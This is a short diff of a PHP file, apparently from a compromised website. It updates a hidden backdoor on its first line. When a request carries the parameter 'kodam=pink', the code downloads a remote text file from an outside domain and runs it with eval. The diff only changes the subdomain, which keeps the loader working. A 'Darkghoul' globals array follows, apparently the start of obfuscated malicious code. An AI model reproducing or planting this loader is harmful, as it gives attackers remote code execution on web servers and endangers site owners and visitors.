@@ -1,4 +1,4 @@
-<?php if (isset($_GET["kodam"]) && $_GET["kodam"] === "pink") { $link = "https://dg.icepenguino.com/ComXUp.txt"; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $link); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);  $output = curl_exec($ch); curl_close($ch); if ($output) { eval("?>" . $output); } } ?>
+<?php if (isset($_GET["kodam"]) && $_GET["kodam"] === "pink") { $link = "https://cn.icepenguino.com/ComXUp.txt"; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $link); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);  $output = curl_exec($ch); curl_close($ch); if ($output) { eval("?>" . $output); } } ?>
 <?php
 
 $GLOBALS['Darkghoul'] = array(
